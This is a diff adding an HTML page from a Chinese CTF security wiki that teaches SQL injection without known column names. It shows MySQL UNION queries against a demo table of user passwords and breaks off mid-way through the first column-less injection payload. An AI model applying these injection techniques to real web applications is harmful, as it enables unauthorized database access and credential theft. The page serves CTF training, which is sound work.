@@ -1,0 +1,1481 @@
+
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="HNUSEC Wiki">
+      
+      
+        <link rel="canonical" href="http://wiki.hnusec.group/CTF-Web/SQL%20Injection/NoColumnInjection%26BypassInformation_schema/">
+      
+      
+        <meta name="author" content="HNUSEC">
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="ja">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
+    
+    
+      
+        <title>No Column Injection & Bypass Information_schema - HNUSEC Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.adb8469c.css">
+      
+        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#009688">
+      
+    
+    
+      <script src="../../../assets/javascripts/modernizr.86422ebf.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
+        <style>body,input{font-family:"Noto Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="teal" data-md-color-accent="pink">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#_1" tabindex="0" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="http://wiki.hnusec.group" title="HNUSEC Wiki" aria-label="HNUSEC Wiki" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">school</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              HNUSEC Wiki
+            </span>
+            <span class="md-header-nav__topic">
+              
+                No Column Injection & Bypass Information_schema
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" aria-label="search" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+<a href="https://github.com/DrsEeker/HNUSEC_Wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    DrsEeker/HNUSEC_Wiki
+  </div>
+</a>
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../.." class="md-tabs__link">
+          Introduction
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../Course/introduction/" class="md-tabs__link">
+          Course
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../CTF-Misc/introduction/" class="md-tabs__link">
+          CTF-Misc
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../introduction/" class="md-tabs__link md-tabs__link--active">
+          CTF-Web
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../CTF-Pwn/introduction/" class="md-tabs__link">
+          CTF-Pwn
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../CTF-Reverse/introduction/" class="md-tabs__link">
+          CTF-Reverse
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../CTF-Crypto/introduction/" class="md-tabs__link">
+          CTF-Crypto
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../Papers/introduction/" class="md-tabs__link">
+          Papers
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../CVE/introduction/" class="md-tabs__link">
+          CVE
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../Links/introduction/" class="md-tabs__link">
+          Links
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../F%26Q/introduction/" class="md-tabs__link">
+          F&Q
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="http://wiki.hnusec.group" title="HNUSEC Wiki" class="md-nav__button md-logo">
+      
+        <i class="md-icon">school</i>
+      
+    </a>
+    HNUSEC Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+<a href="https://github.com/DrsEeker/HNUSEC_Wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    DrsEeker/HNUSEC_Wiki
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
+    
+    <label class="md-nav__link" for="nav-1">
+      Introduction
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        Introduction
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../.." title="Getting Started" class="md-nav__link">
+      Getting Started
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Introduction/contest/" title="CTF Contest Content" class="md-nav__link">
+      CTF Contest Content
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Introduction/about_us/" title="About us" class="md-nav__link">
+      About us
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      Course
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Course
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Course/introduction/" title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2">
+    
+    <label class="md-nav__link" for="nav-2-2">
+      Computer Network
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-2">
+        Computer Network
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2-1" type="checkbox" id="nav-2-2-1">
+    
+    <label class="md-nav__link" for="nav-2-2-1">
+      Protocol
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-2-1">
+        Protocol
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Course/Computer%20Network/Protocol/icmp/" title="ICMP" class="md-nav__link">
+      ICMP
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Course/Computer%20Network/resource/" title="Resource" class="md-nav__link">
+      Resource
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Course/Computer%20Network/tools/" title="Tools" class="md-nav__link">
+      Tools
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      CTF-Misc
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        CTF-Misc
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../CTF-Misc/introduction/" title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
+    
+    <label class="md-nav__link" for="nav-4">
+      CTF-Web
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        CTF-Web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../introduction/" title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-2" type="checkbox" id="nav-4-2" checked>
+    
+    <label class="md-nav__link" for="nav-4-2">
+      SQL Injection
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-2">
+        SQL Injection
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        No Column Injection & Bypass Information_schema
+      </label>
+    
+    <a href="./" title="No Column Injection & Bypass Information_schema" class="md-nav__link md-nav__link--active">
+      No Column Injection & Bypass Information_schema
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    无列名注入
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#union" class="md-nav__link">
+    UNION注入
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#join" class="md-nav__link">
+    JOIN报错注入
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    获取表名
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#innodb" class="md-nav__link">
+    Innodb
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sys" class="md-nav__link">
+    Sys
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#performance_schema" class="md-nav__link">
+    Performance_schema
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    参考链接
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      CTF-Pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        CTF-Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../CTF-Pwn/introduction/" title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      CTF-Reverse
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        CTF-Reverse
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../CTF-Reverse/introduction/" title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
+    
+    <label class="md-nav__link" for="nav-7">
+      CTF-Crypto
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        CTF-Crypto
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../CTF-Crypto/introduction/" title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8">
+    
+    <label class="md-nav__link" for="nav-8">
+      Papers
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-8">
+        Papers
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Papers/introduction/" title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
+    
+    <label class="md-nav__link" for="nav-9">
+      CVE
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-9">
+        CVE
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../CVE/introduction/" title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-10" type="checkbox" id="nav-10">
+    
+    <label class="md-nav__link" for="nav-10">
+      Links
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-10">
+        Links
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Links/introduction/" title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Links/tools/" title="Tools" class="md-nav__link">
+      Tools
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Links/CTF/study/" title="CTF" class="md-nav__link">
+      CTF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-10-4" type="checkbox" id="nav-10-4">
+    
+    <label class="md-nav__link" for="nav-10-4">
+      Operating System
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-10-4">
+        Operating System
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Links/Operating%20System/content/" title="MACOS" class="md-nav__link">
+      MACOS
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-11" type="checkbox" id="nav-11">
+    
+    <label class="md-nav__link" for="nav-11">
+      F&Q
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-11">
+        F&Q
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../F%26Q/introduction/" title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    无列名注入
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#union" class="md-nav__link">
+    UNION注入
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#join" class="md-nav__link">
+    JOIN报错注入
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    获取表名
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#innodb" class="md-nav__link">
+    Innodb
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sys" class="md-nav__link">
+    Sys
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#performance_schema" class="md-nav__link">
+    Performance_schema
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    参考链接
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/DrsEeker/HNUSEC_Wiki/edit/master/docs/CTF-Web/SQL Injection/NoColumnInjection&BypassInformation_schema.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                  <h1>No Column Injection & Bypass Information_schema</h1>
+                
+                <blockquote>
+<p>本文作者@zww</p>
+</blockquote>
+<h2 id="_1">无列名注入</h2>
+<h3 id="union">UNION注入</h3>
+<p><div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span><span class="p">;</span>      
+<span class="o">+</span><span class="c1">------+------+----------+</span>
+<span class="o">|</span> <span class="n">id</span>   <span class="o">|</span> <span class="n">name</span> <span class="o">|</span> <span class="n">pwd</span>      <span class="o">|</span>
+<span class="o">+</span><span class="c1">------+------+----------+</span>
+<span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span> <span class="n">zww</span>  <span class="o">|</span> <span class="mi">123456</span>   <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">2</span> <span class="o">|</span> <span class="n">zww2</span> <span class="o">|</span> <span class="mi">1234567</span>  <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">3</span> <span class="o">|</span> <span class="n">zww3</span> <span class="o">|</span> <span class="mi">12345678</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">------+------+----------+</span>
+<span class="mi">3</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div>
+这是表newtable内的数据</p>
+<p>接下来我们看看union注入中会遇到的一个小区别点
+<div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">------+------+----------+</span>
+<span class="o">|</span> <span class="n">id</span>   <span class="o">|</span> <span class="n">name</span> <span class="o">|</span> <span class="n">pwd</span>      <span class="o">|</span> <span class="o">&lt;&lt;</span> <span class="err">重点看这里</span>
+<span class="o">+</span><span class="c1">------+------+----------+</span>
+<span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span> <span class="n">zww</span>  <span class="o">|</span> <span class="mi">123456</span>   <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">2</span> <span class="o">|</span> <span class="n">zww2</span> <span class="o">|</span> <span class="mi">1234567</span>  <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">3</span> <span class="o">|</span> <span class="n">zww3</span> <span class="o">|</span> <span class="mi">12345678</span> <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="mi">3</span>        <span class="o">|</span>
+<span class="o">+</span><span class="c1">------+------+----------+</span>
+<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div>
+与
+<div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">------+------+----------+</span>
+<span class="o">|</span> <span class="mi">1</span>    <span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="mi">3</span>        <span class="o">|</span> <span class="o">&lt;&lt;</span> <span class="err">重点看这里</span>
+<span class="o">+</span><span class="c1">------+------+----------+</span>
+<span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="mi">3</span>        <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span> <span class="n">zww</span>  <span class="o">|</span> <span class="mi">123456</span>   <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">2</span> <span class="o">|</span> <span class="n">zww2</span> <span class="o">|</span> <span class="mi">1234567</span>  <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">3</span> <span class="o">|</span> <span class="n">zww3</span> <span class="o">|</span> <span class="mi">12345678</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">------+------+----------+</span>
+<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div></p>
+<p>通过这两个sql语句的对比，可以看到select 1, 2, 3在前的话，对应的列名也会变成1, 2, 3，所以这里是可以进行无列名注入的一个点</p>
+<p>我们union注入的payload就是基于上面的原理
+<div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">`</span><span class="mi">1</span><span class="o">`</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span><span class="p">)</span><span class="n">a</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">------+</span>
+<span class="o">|</span> <span class="mi">1</span>    <span class="o">|</span>
+<span class="o">+</span><span class="c1">------+</span>
+<span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span>
